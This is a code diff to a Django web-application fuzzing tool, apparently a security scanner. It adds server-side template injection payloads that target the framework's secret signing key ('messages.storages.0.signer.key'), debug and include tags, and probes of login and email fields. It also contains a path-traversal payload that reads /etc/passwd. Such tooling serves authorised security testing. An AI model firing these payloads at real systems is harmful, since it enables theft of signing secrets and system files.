@@ -187,7 +187,11 @@ class DJUtils:
             'useri':[],
             'iauth':[],
             'payfv':[],
-            'ptpay':[]
+            'ptpay':[],
+            'sstip_values':[],
+            'sstip_headers':[],
+            'sstip_all':[],
+            'authfuzz':[]
         }
 
         base_form = base_form
@@ -213,6 +217,10 @@ class DJUtils:
 
         # fuzz all inputs / step 2
         for field, value in base_form.items():
+            fuzz_scope['sstip_headers'].append({field:"{{ messages.storages.0.signer.key }}"})
+            fuzz_scope['sstip_values'].append({"{{ messages.storages.0.signer.key }}": value})
+            fuzz_scope['sstip_all'].append({"{% debug %}":"{{ messages.storages.0.signer.key }}"})
+
             fuzz_scope['allin'].append({field: choice(all_payloads)})
             fuzz_scope['ptpay'].append({field:"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"})
             
@@ -222,15 +230,24 @@ class DJUtils:
                 fuzz_scope['payfv'].append({choice(all_payloads): choice(all_payloads)})
             
             # fuzz auth endpoints - with valid values / invalid creds
-            if field == 'username':
+            if field in ['username', 'user', 'usuário', 'usuario']:
                 creds = vfp.get_random_credential()
+
                 fuzz_scope['iauth'].append({field: creds.get('username')})
+                fuzz_scope['authfuzz'].append({field:"{{ messages.storages.0.signer.key}}"})
+                fuzz_scope['authfuzz'].append({"{% debug %}":creds.get('username')})
 
-            elif field == 'password':
+            elif field in ['password', 'senha', 'secret', 'passwd']:
                 fuzz_scope['iauth'].append({field: creds.get('password')})
+                fuzz_scope['authfuzz'].append({field:"{{ messages.storages.0.signer.key }}"})
+                fuzz_scope['authfuzz'].append({"{{ messages.storages.0.signer.key }}":creds.get('password')})
 
-            elif field in ['email', 'user_email']:
+            elif field in ['email', 'user_email', 'emailaddress', 'mail']:
                 fuzz_scope['iauth'].append({field: self.get_wrmail()}) 
+
+                fuzz_scope['authfuzz'].append({"{% debug %}":"{{ messages.storages.0.signer.key }}@{% debug %}"})
+                fuzz_scope['authfuzz'].append({field:"{{ messages.storages.0.signer.key }}@{% debug %}"})
+                fuzz_scope['authfuzz'].append({"{{ messages.storages.0.signer.key }}":self.get_wrmail()})
 
 
         return fuzz_scope
@@ -370,6 +387,10 @@ class DJUtils:
                             urljoin(self.target,url_path.replace(url_p, str(choice(ssti_payloads)))
                             )
                         )
+                        self.random_ssti_payloads.append(
+                            urljoin(self.target,url_path.replace(url_p, "{% include 'admin/base.html' %}")
+                            )
+                        )
                         self.random_sqli_payloads.append(
                             urljoin(self.target,url_path.replace(url_p, str(choice(sqli_payloads)))
                             )
@@ -398,7 +419,10 @@ class DJUtils:
                         [
                             urljoin(self.target, pattern.replace('{{fuzz_flag}}',str(choice(range(9000))))),
                             urljoin(self.target, pattern.replace('{{fuzz_flag}}',Generic().text.word())),
-                            urljoin(self.target, pattern.replace('{{fuzz_flag}}',str(Generic().numbers.float_number())))
+                            urljoin(self.target, pattern.replace('{{fuzz_flag}}',str(Generic().numbers.float_number()))),
+                            urljoin(self.target, pattern.replace('{{fuzz_flag}}',"""${{<%[%'"}}%\.""")),
+                            urljoin(self.target, pattern.replace('{{fuzz_flag}}',"{% csrf_token %}")),
+                            urljoin(self.target, pattern.replace('{{fuzz_flag}}',"{% include 'admin/base.html' %}"))
                         ]
                     )
 
@@ -479,10 +503,13 @@ class DJUtils:
             total_xocc = total_xocc + occ_count
 
             x_summary = exception['EXCEPTION_SUMMARY']
-            x_loc_full = x_summary['Exception Location']
-            x_location = '/'+'/'.join(x_loc_full.split()[0].split('/')[-3:])
-            x_line_number = x_loc_full.split()[-1]
-            x_function = x_loc_full.split()[-3].replace(',','')
+            x_loc_items = x_summary['Exception Location'].split()
+            x_line_number = x_loc_items[x_loc_items.index('line') + 1]
+            x_function = x_loc_items[x_loc_items.index('in') + 1]
+            x_location = '/'+'/'.join(x_loc_items[0].split('/')[-3:]).replace(',','').strip()
+            x_function = x_function.replace(',','').strip()
+            x_line_number = x_line_number.replace(',','').strip()
+ 
             installed_items = exception['INSTALLED_ITEMS']
 
             lines_count = 0
